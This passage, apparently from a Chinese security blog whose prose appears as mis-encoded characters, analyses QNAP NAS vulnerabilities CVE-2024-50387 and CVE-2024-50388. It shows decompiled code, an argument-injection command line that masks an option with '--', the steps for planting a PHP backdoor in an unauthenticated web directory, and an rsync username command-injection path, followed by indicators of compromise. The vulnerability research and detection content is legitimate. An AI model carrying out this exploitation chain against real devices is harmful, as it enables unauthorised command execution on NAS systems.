class="line"><span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sqlite3_busy_timeout(v65, <span class="number">20000LL</span>);</span><br><span class="line">LODWORD(modes) = sqlite3_exec(v65, v14, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œå‡½æ•°åœ¨æ‹¼æ¥ SQL è¯­å¥æ—¶ä½¿ç”¨äº†ä¸å®‰å…¨çš„ <code>%s</code> å‚æ•°ï¼Œæ˜¯å­˜åœ¨ SQL æ³¨å…¥é£é™©çš„ã€‚å…¶ä¸­ INSERT è¯­å¥çš„ <code>conn_app</code> åˆ—å°±æ˜¯å¤–éƒ¨ä¼ å…¥çš„ <code>-A</code> å‚æ•°å€¼ã€‚</p>
<p>åˆ°è¿™é‡Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†å…¬å‘Šä¸­æåˆ°çš„ä¸¤ä¸ªæ¼æ´ç‚¹ï¼Œå‚æ•°æ³¨å…¥å¯¼è‡´ SQL æ³¨å…¥ï¼Œä½†æ˜¯è¿˜å­˜åœ¨ä¸€äº›å…³é”®é—®é¢˜éœ€è¦è§£å†³ã€‚</p>
<ol>
<li>æ‰§è¡Œ <code>log_tool</code> å‘½ä»¤æ—¶é»˜è®¤æ˜¯å¸¦æœ‰ <code>-S</code> å‚æ•°çš„ï¼Œå¯¼è‡´æ— æ³•è°ƒç”¨åˆ° <code>naslog_conn_add2</code> å‡½æ•°ï¼Œä¸èƒ½è§¦å‘ SQL æ³¨å…¥ã€‚</li>
<li>å‡è®¾å¯ä»¥è§¦å‘ SQL æ³¨å…¥ï¼Œè€ƒè™‘åˆ°ç›®æ ‡æ•°æ®åº“æ˜¯ sqliteï¼Œåˆ©ç”¨æ€è·¯åº”è¯¥æ˜¯å†™ web åé—¨ã€‚é‚£ä¹ˆè¿™ä¸ªåé—¨åº”è¯¥å†™å…¥åˆ°ç³»ç»Ÿå“ªä¸ªä½ç½®æ‰èƒ½è§¦å‘ã€‚</li>
</ol>
<p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œè§‚å¯Ÿ <code>sub_A880</code> æ‹¼æ¥å‘½ä»¤çš„ä»£ç ï¼Œä½¿ç”¨äº† snprintf å‡½æ•°ï¼Œæœ€å¤§é•¿åº¦ä¸º 0x800ã€‚é‚£ä¹ˆç¬¬ä¸€ä¸ªæ€è·¯æ˜¯èƒ½å¦é€šè¿‡ä¼ å…¥è¶…é•¿çš„ç”¨æˆ·åæˆ–ä¸»æœºåï¼Œè®©æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ <code>-S</code> å‚æ•°è¢«æˆªæ–­ã€‚æŸ¥çœ‹ Samba æºä»£ç å‘ç°ï¼Œç”¨æˆ·åæœ€å¤§é•¿åº¦ä¸º 0x200ï¼Œä¸»æœºåæœ€å¤§é•¿åº¦ä¸º 256ï¼Œå› æ­¤æ— æ³•æˆªæ–­å‚æ•°ã€‚</p>
<p>å¦ä¸€ä¸ªæ€è·¯å°±æ˜¯ä»å‘½ä»¤æœ¬èº«å‡ºå‘ï¼Œèƒ½å¦ä¼ å…¥æŸäº›å­—ç¬¦å°†åç»­çš„å‚æ•°å±è”½ã€‚æˆ‘æƒ³åˆ°ä½¿ç”¨ <code>#</code> å­—ç¬¦æ¥æ³¨é‡Šåç»­å‚æ•°ï¼Œå½¢æˆç±»ä¼¼å¦‚ä¸‹çš„å‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;test&#x27;</span> -A <span class="string">&quot;sql_payload&quot;</span> -p <span class="string">&#x27;127.0.0.1&#x27;</span> -m <span class="string">&#x27;linux&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> <span class="comment"># &#x27;dummy&#x27; -p &#x27;192.168.x.x&#x27; -m &#x27;xxx&#x27; -i 1 -n 9 -a &#x27;---&#x27; -S</span></span><br></pre></td></tr></table></figure></div>

<p>ä½† <code>escape_shell_string</code> ä¼šåœ¨ <code>#</code> å‰é¢ä¹Ÿæ·»åŠ åæ–œæ è½¬ä¹‰ï¼Œå¯¼è‡´æ³¨é‡Šå¤±è´¥ã€‚</p>
<p>smbrun æœ€ç»ˆæ˜¯è°ƒç”¨ <code>sh -c</code> æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ä¸€äº› SHELL ä¸­ç‰¹æ€§ï¼Œå½“åœ¨ä¸€æ¡å‘½ä»¤ä¸­ä½¿ç”¨ <code>--</code>ï¼Œå³ä¸¤ä¸ªçŸ­æ¨ªçº¿æ—¶ï¼Œè¡¨ç¤ºå‘½ä»¤é€‰é¡¹ç»“æŸï¼Œåç»­çš„å†…å®¹ä¼šè¢«è®¤ä¸ºæ˜¯æ™®é€šæ•°æ®ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„å‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;test&#x27;</span> -A <span class="string">&quot;sql_payload&quot;</span> -p <span class="string">&#x27;127.0.0.1&#x27;</span> -m <span class="string">&#x27;linux&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -- <span class="string">&#x27;dummy&#x27;</span> -p <span class="string">&#x27;192.168.x.x&#x27;</span> -m <span class="string">&#x27;xxx&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -S</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ä» dummy å¼€å§‹çš„å†…å®¹éƒ½ä¸ä¼šè¢«è®¤ä¸ºæ˜¯å‘½ä»¤é€‰é¡¹ï¼Œå°±å¯ä»¥å±è”½ <code>-S</code> å‚æ•°ï¼Œæœ€ç»ˆä½¿ <code>log_tool</code> è°ƒç”¨ <code>naslog_conn_add2</code> å‡½æ•°ã€‚</p>
<p>åç»­çš„åˆ©ç”¨æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œåœ¨ <code>-A</code> ä¹‹åæ’å…¥ SQL æ³¨å…¥çš„ payloadï¼Œå¯ä»¥å†™å…¥ PHP åé—¨æ–‡ä»¶ã€‚é‚£ä¹ˆåº”è¯¥å°†åé—¨æ”¾åœ¨å“ªé‡Œæ‰èƒ½è§£æï¼Ÿ</p>
<p>æœ¬åšå®¢æ›¾ç»<a href="https://wzt.ac.cn/2023/02/06/CVE-2022-27596/">å¤ç°è¿‡</a> QNAP çš„ä¸€ä¸ª SQL æ³¨å…¥æ¼æ´ï¼Œå½“æ—¶æä¾›çš„æ€è·¯ä¸ºç»“åˆ MusicStation æˆ– VideoStation ç­‰ PHP ç¼–å†™çš„æ’ä»¶æ¥åˆ©ç”¨ã€‚å®é™…ä¸Šåœ¨ç³»ç»Ÿæœ¬èº«çš„ Web æœåŠ¡ä¸­ï¼ŒæŸäº›è·¯å¾„ä¸‹ä¹Ÿå¯ä»¥è§£æ PHP ä»£ç ã€‚ä¾‹å¦‚ <code>/mnt/ext/opt/QuLog/opt/www/</code>ï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ª PHP æ–‡ä»¶ï¼Œè®¿é—®å³å¯æ‰§è¡Œä¸”ä¸éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p>é‚£ä¹ˆç®€å•æ€»ç»“ä¸€ä¸‹è¯¥æ¼æ´çš„åˆ©ç”¨æ¡ä»¶å’Œæ€è·¯</p>
<ol>
<li>é¦–å…ˆéœ€è¦èƒ½å¤Ÿè®¿é—®åˆ°ç³»ç»Ÿçš„ SMB ä»¥åŠ Web æœåŠ¡ï¼Œå¹¶ä¸”è¿™ä¸ª SMB æœåŠ¡åº”è¯¥æ˜¯ SMB Service æ’ä»¶å¯åŠ¨çš„</li>
<li>åˆ©ç”¨å‚æ•°æ³¨å…¥æ¼æ´ï¼Œé€šè¿‡ç”¨æˆ·åå‘å‘½ä»¤ä¸­æ’å…¥ <code>-A</code> ä»¥åŠ <code>--</code>ï¼Œåœ¨ <code>-A</code> å‚æ•°ä¸­å¸ƒç½® SQL æ³¨å…¥ payload</li>
<li>è§¦å‘ SQL æ³¨å…¥æ¼æ´ï¼Œå‘ <code>/mnt/ext/opt/QuLog/opt/www/</code> ç›®å½•ä¸‹å†™å…¥äº† PHP åé—¨æ–‡ä»¶</li>
<li>è®¿é—®åé—¨å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</li>
</ol>
<h1 id="CVE-2024-50388"><a href="#CVE-2024-50388" class="headerlink" title="CVE-2024-50388"></a>CVE-2024-50388</h1><p>æ ¹æ®<a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-41" >å®˜æ–¹å…¬å‘Š<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œè¯¥æ¼æ´å½±å“ QNAP NAS ä¸­çš„ HBS3 æ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶æ˜¯ç”¨æ¥å°†æœ¬åœ°å’Œäº‘ç«¯æ•°æ®è¿›è¡ŒåŒæ­¥çš„ï¼Œä¹Ÿæ˜¯ QNAP NAS ä¸­ä½¿ç”¨éå¸¸å¹¿æ³›çš„ä¸€ä¸ªæ’ä»¶ã€‚æ ¹æ® ZDI åœ¨æ¯”èµ›ä¸­å‘å¸ƒçš„<a class="link"   href="https://www.bleepingcomputer.com/news/security/qnap-fixes-nas-backup-software-zero-day-exploited-at-pwn2own/" >ä¿¡æ¯<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
<p>ä¾æ—§æ˜¯ä¸‹è½½æ–°ç‰ˆæ’ä»¶è¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼ŒHBS3 çš„å¤§éƒ¨åˆ†ç»„ä»¶éƒ½æ˜¯ç”¨ Python ç¼–å†™çš„ï¼Œè€Œæ–°ç‰ˆæœ¬ä¸­è¿™äº›æ–‡ä»¶è¢«ç¼–è¯‘æˆ python3.11 ç‰ˆæœ¬çš„å­—èŠ‚ç ï¼Œç›®å‰ä¼¼ä¹è¿˜æ²¡æœ‰èƒ½å¤Ÿå®Œå…¨åç¼–è¯‘çš„å·¥å…·ã€‚ä¸è¿‡é€šè¿‡åˆ†æï¼Œè¯¥æ¼æ´å¯èƒ½å¹¶ä¸æ˜¯ä½äº python ä»£ç ä¸­ï¼Œå¯¹æ¯”å‘ç°æ–°ç‰ˆçš„ rsync ç­‰ç¨‹åºä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Old</span></span><br><span class="line"><span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s \&quot;%s\&quot; %s \&quot;%s\&quot;&quot;</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, v19, <span class="string">&quot;-s&quot;</span>, v20);</span><br><span class="line">v14 = popen(v22, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">v15 = v14;</span><br><span class="line"><span class="keyword">if</span> ( v14 )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( fgets(v21, <span class="number">64</span>, v14) )</span><br><span class="line">&#123;</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(v21, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    *v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = strtol(v21, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = <span class="number">-6</span>;</span><br><span class="line">&#125;</span><br><span class="line">pclose(v15);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v17;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// New</span></span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%s %s \&quot;%s\&quot; %s \&quot;%s\&quot;&quot;</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, en_username, <span class="string">&quot;-p&quot;</span>, password);</span><br><span class="line">result = mkstemp(templatea);</span><br><span class="line"><span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">close(result);</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line">sub_42C100(templatea, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, en_username, <span class="string">&quot;-p&quot;</span>);</span><br><span class="line">v4 = fopen(templatea, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( fgets(nptr, <span class="number">65</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">strchr</span>(nptr, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        *v5 = <span class="number">0</span>;</span><br><span class="line">      v3 = strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( feof(v4) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br><span class="line">unlink(templatea);</span><br><span class="line"><span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure></div>

<p>å¾ˆæ˜æ˜¾ï¼Œæ—§ç‰ˆä»£ç æ‹¼æ¥å‘½ä»¤ä¹‹åç›´æ¥ä½¿ç”¨ popen æ¥æ‰§è¡Œï¼Œè€Œæ–°ç‰ˆæ”¹ä¸ºä½¿ç”¨ <code>sub_42C100</code> å‡½æ•°ï¼Œå…¶å†…éƒ¨å®é™…ä¸Šæ˜¯è°ƒç”¨ execve å‚æ•°åŒ–æ‰§è¡Œï¼Œé¿å…èƒ½å¤Ÿç›´æ¥æ³¨å…¥å‘½ä»¤ã€‚</p>
<p>rsync è¿™ä¸ªæœåŠ¡é»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„ï¼Œéœ€è¦æ‰‹åŠ¨åœ¨ HBS3 æ’ä»¶ä¸­å¼€å¯ï¼Œå¼€å¯ä¹‹åç¨‹åºä¼šç›‘å¬ 873 ç«¯å£ã€‚</p>
<p>ä¸‹é¢éœ€è¦ç®€å•äº†è§£ä¸€ä¸‹ rsyncï¼Œå¼„æ¸…æ¥šåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥è§¦å‘åˆ°è¿™ä¸ªå‘½ä»¤æ³¨å…¥ã€‚rsync æ˜¯ä¸€ç§ Linux ä¸‹çš„è¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿåœ¨ä¸¤å°ä¸»æœºä¹‹é—´åŒæ­¥æ–‡ä»¶ï¼Œèƒ½å¤Ÿç”¨æ¥å®ç°æ–‡ä»¶å¤‡ä»½ç­‰æ“ä½œï¼Œè¿™ç§æœåŠ¡å¯èƒ½åœ¨ä¼ä¸šåœºæ™¯ä¸‹ä¼šæœ‰æ›´å¤šä½¿ç”¨ã€‚</p>
<p>å®ƒåœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä½¿ç”¨ â€œrsync ç®—æ³•â€ æ¥åŒæ­¥æ–‡ä»¶ï¼Œç”±äºæŸäº›åŸå› ï¼Œä¸¤ç«¯é€šä¿¡ä½¿ç”¨çš„åè®®å¹¶æ²¡æœ‰è¢«æ ‡å‡†åŒ–ï¼Œè€Œä¸”å®ç°äº† rsync çš„å¼€æºé¡¹ç›®ä¹Ÿæ¯”è¾ƒå°‘ï¼Œå¯ä»¥å‚è€ƒ <a class="link"   href="https://rsync.samba.org/how-rsync-works.html" >samba æä¾›çš„æ–‡æ¡£<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä»¥åŠæŠ“åŒ…æ¥å¤§è‡´äº†è§£åè®®ç»“æ„ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬åˆ†æä¸€ä¸‹æ¼æ´ç‚¹ï¼Œå®ƒæ˜¯åœ¨ <code>auth_server</code> å‡½æ•°ä¸­è¢«è°ƒç”¨çš„</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( RConf_Get_Field(<span class="string">&quot;/etc/config/rsyncd.conf&quot;</span>, <span class="number">4705734LL</span>, <span class="string">&quot;HBS3 AuthMode&quot;</span>, auth_mode, <span class="number">64LL</span>) )</span><br><span class="line">  sub_45AB70(auth_mode, <span class="number">64LL</span>, <span class="number">0x472BE2</span>LL, <span class="string">&quot;RSYNC&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC&quot;</span>, auth_mode) || !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC_AND_NAS&quot;</span>, auth_mode) )</span><br><span class="line">&#123;</span><br><span class="line">  v55 = qword_6A5DC0;</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6A5DC0 )</span><br><span class="line">    v55 = <span class="string">&quot;/etc/config/rsyncd.conf&quot;</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, v55, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync user&quot;</span>, rsync_user, <span class="number">65LL</span>) )</span><br><span class="line">    <span class="built_in">strcpy</span>(rsync_user, <span class="string">&quot;rsync&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync enpswd&quot;</span>, rsync_encpwd, <span class="number">513LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync pswd&quot;</span>, rsync_pwd, <span class="number">129LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(src, <span class="string">&quot;rsync&quot;</span>, <span class="number">0x81</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(command, <span class="string">&quot;/sbin/get_encstr %s e 2&gt;/dev/null&quot;</span>, rsync_pwd);</span><br><span class="line">      v56 = popen(command, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      v57 = v56;</span><br><span class="line">      <span class="keyword">if</span> ( v56 )</span><br><span class="line">      &#123;</span><br><span class="line">        fgets(rsync_encpwd, <span class="number">513</span>, v56);</span><br><span class="line">        pclose(v57);</span><br><span class="line">      &#125;</span><br><span class="line">      rsync_encpwd[<span class="built_in">strlen</span>(rsync_encpwd)] = <span class="number">0</span>;</span><br><span class="line">      sub_42B690(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync enpswd&quot;</span>, rsync_encpwd);</span><br><span class="line">      sub_42B740(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync pswd&quot;</span>);</span><br><span class="line">      v58 = Decrypt_Rsync_Password(rsync_encpwd, src, <span class="number">129LL</span>);</span><br><span class="line">      v59 = <span class="number">342</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v58 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v58 = Decrypt_Rsync_Password(rsync_encpwd, src, <span class="number">129LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v58 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v59 = <span class="number">349</span>;</span><br><span class="line">LABEL_77:</span><br><span class="line">      sub_429040(<span class="number">3LL</span>, <span class="string">&quot;decrypt password fail (%d), L%d\n&quot;</span>, v58, v59);</span><br><span class="line">      <span class="keyword">return</span> __strdup(username);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *v97 = <span class="number">0LL</span>;</span><br><span class="line">  v98 = <span class="number">0LL</span>;</span><br><span class="line">  v99 = <span class="number">0LL</span>;</span><br><span class="line">  v100 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v106, <span class="number">0</span>, <span class="keyword">sizeof</span>(v106));</span><br><span class="line">  v73 = <span class="built_in">strcpy</span>(v106, src);</span><br><span class="line">  sub_456A90(v73, v96, v97);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(rsync_user, username) &amp;&amp; !<span class="built_in">strcmp</span>(v97, password) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_42C840(<span class="number">0</span>, a5, <span class="number">0LL</span>, a7, a8, a9, a10, v53, v54, a13, a14);</span><br><span class="line">    <span class="keyword">return</span> __strdup(username);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( auth_mode[<span class="number">0</span>] != <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( auth_mode[<span class="number">0</span>] != <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( auth_mode[<span class="number">1</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; auth_mode[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; !auth_mode[<span class="number">3</span>] )</span><br><span class="line">  <span class="keyword">goto</span> nas_auth;</span><br><span class="line">LABEL_109:</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC_AND_NAS&quot;</span>, auth_mode) )</span><br><span class="line">&#123;</span><br><span class="line">nas_auth:</span><br><span class="line">  v75 = dword_6A6074;</span><br><span class="line">  v74 = dword_6A5EC4;</span><br><span class="line">LABEL_112:</span><br><span class="line">  v76 = sub_4105C0();</span><br><span class="line">  sub_429040(<span class="number">6LL</span>, <span class="string">&quot;%s:L%d [%s] check nas account, d[%d] s[%d]\n&quot;</span>, <span class="string">&quot;auth_server&quot;</span>, <span class="number">374</span>, v76, v74, v75);</span><br><span class="line">  <span class="keyword">if</span> ( (a3 != <span class="number">-1</span> || dword_6A6070 || dword_6A6074 != <span class="number">1</span> || dword_6A5EC4 != <span class="number">-1</span> || dword_694F1C != <span class="number">1</span> || dword_6A6078)</span><br><span class="line">    &amp;&amp; (check_nas_pwd(username, password) || sub_42B900(username) != <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_42C840(<span class="number">1</span>, a5, username, a7, a8, a9, a10, v77, v78, a13, a14);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®å‡½æ•°åç§°ä»¥åŠéƒ¨åˆ†ä»£ç æ¨æ–­ï¼Œè¿›è¡Œ rsync èº«ä»½éªŒè¯æ—¶å¯èƒ½ä¼šè°ƒç”¨åˆ°æ¼æ´å‡½æ•° (<code>check_nas_pwd</code>)ï¼Œè€Œä¸”ä¼ å…¥çš„å‚æ•°ä¸ºç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>é€šè¿‡æŠ“åŒ…å’Œé™æ€åˆ†æä»£ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥ rsync æœåŠ¡ç«¯è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå¯èƒ½ä¼šè¿›è¡Œä»¥ä¸‹å‡ ä¸ªæ­¥éª¤</p>
<ol>
<li>æœåŠ¡ç«¯å‘é€ <code>@RSYNCD</code>ï¼Œè¡¨æ˜è‡ªå·±çš„ç‰ˆæœ¬ï¼Œä»¥åŠæ”¯æŒçš„èº«ä»½éªŒè¯ hash ç®—æ³•</li>
<li>å®¢æˆ·ç«¯å‘é€ <code>@RSYNCD</code>ï¼Œè¡¨æ˜è‡ªå·±çš„ç‰ˆæœ¬ï¼Œé€‰å®šä¸€ä¸ª hash ç®—æ³•</li>
<li>æœåŠ¡å™¨å‘é€ <code>AUTHREQD</code>ï¼Œè¦æ±‚å¯†ç è®¤è¯</li>
<li>å®¢æˆ·ç«¯å°†è´¦æˆ·ä¿¡æ¯å‘é€åˆ°æœåŠ¡ç«¯</li>
</ol>
<p>å› æ­¤å¯ä»¥æ¨æ–­ï¼Œå®¢æˆ·ç«¯å‘é€ç”¨æˆ·åå’Œå¯†ç æ—¶ï¼Œå°±ä¼šè°ƒç”¨åˆ°æ¼æ´å‡½æ•°ï¼Œå¦‚æœåœ¨ç”¨æˆ·åä¸­ç›´æ¥æ„é€ å‘½ä»¤æ³¨å…¥ payloadï¼Œå°±èƒ½å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥åˆ©ç”¨è¯¥æ¼æ´çš„æ¡ä»¶å’Œæ€è·¯åº”è¯¥æ˜¯</p>
<ol>
<li>è®¾å¤‡å¼€å¯äº† rsync æœåŠ¡ï¼Œèƒ½å¤Ÿè®¿é—®åˆ° 873 ç«¯å£</li>
<li>å‘æœåŠ¡å™¨å‘é€è®¤è¯ä¿¡æ¯ï¼Œåœ¨ç”¨æˆ·åå¤„æ„é€ å‘½ä»¤æ³¨å…¥ payload</li>
</ol>
<h1 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h1><p>åˆ©ç”¨è¿™äº›æ¼æ´å¯èƒ½ä¼šåœ¨ç³»ç»Ÿä¸­ç•™ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œæˆ‘åœ¨è¿™é‡Œåšä¸€äº›ç®€å•çš„è®°å½•ã€‚</p>
<p>åˆ©ç”¨ CVE-2024-50387 SMB æ¼æ´æ—¶ï¼Œå¦‚æœåœ¨ QuLog Center ç³»ç»Ÿæ—¥å¿—ä¸­å¿ƒå¼€å¯äº† SMB æ—¥å¿—è®°å½•ï¼Œå¯èƒ½ä¼šçœ‹åˆ°å¦‚ä¸‹æ—¥å¿—ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">è­¦å‘Š  2024-11-20  18:00:00  WORKGROUP\test  192.168.0.100  linux  ---  ---  SMB  ---  ç™»å½•å¤±è´¥</span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…æŸ¥çœ‹ <code>/var/nc.log</code> æ˜¯å¦å­˜åœ¨ SMB ç™»å½•å¤±è´¥ç­‰ä¿¡æ¯ã€‚ä¸è¿‡è€ƒè™‘åˆ°æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„å‚æ•°ï¼Œæˆ–è€…åœ¨è·å–ç³»ç»Ÿæƒé™ä¹‹åæ“¦é™¤æ—¥å¿—ï¼Œæ‰€ä»¥ä»¥ä¸Šä»…èƒ½ä½œä¸ºç®€å•çš„å‚è€ƒï¼Œè¿˜å¯ä»¥æ’æŸ¥ WEB è·¯å¾„ä¸‹æ˜¯å¦å¤šå‡ºäº†æœªçŸ¥çš„ PHP æ–‡ä»¶ã€‚</p>
